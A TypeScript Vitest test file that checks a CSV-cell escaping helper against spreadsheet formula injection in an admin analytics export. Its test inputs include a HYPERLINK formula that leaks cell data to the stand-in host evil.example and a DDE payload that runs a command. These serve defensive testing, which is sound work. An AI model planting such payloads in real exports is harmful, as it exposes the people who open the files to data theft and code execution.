import { describe, it, expect } from "vitest"
import { readFileSync } from "node:fs"
import { join } from "node:path"
import { csvCell, csvRow } from "@/lib/security/csv"

describe("csvCell (spreadsheet formula injection)", () => {
  it("defuses every formula trigger a visitor can type into a search", () => {
    for (const evil of [
      '=HYPERLINK("https://evil.example/?"&A2,"x")',
      "+cmd|' /C calc'!A0",
      "-2+3",
      "@SUM(A1:A9)",
      "\t=1+1",
      "\r=1+1",
    ]) {
      expect(csvCell(evil).startsWith(`"'`)).toBe(true)
    }
  })

  it("quotes so commas, quotes and newlines stay inside one cell", () => {
    expect(csvCell('a,"b"\nc')).toBe('"a,""b""\nc"')
    expect(csvRow(["x", null, 3])).toBe('"x","","3"\n')
  })

  it("leaves real numbers alone", () => {
    expect(csvCell(-4)).toBe('"-4"')
  })

  it("is what the admin export actually uses", () => {
    const src = readFileSync(
      join(process.cwd(), "src/app/api/admin/analytics/export/route.ts"),
      "utf8",
    )
    expect(src).toContain("csvRow(")
    expect(src).not.toMatch(/csv \+= `/)
  })
})
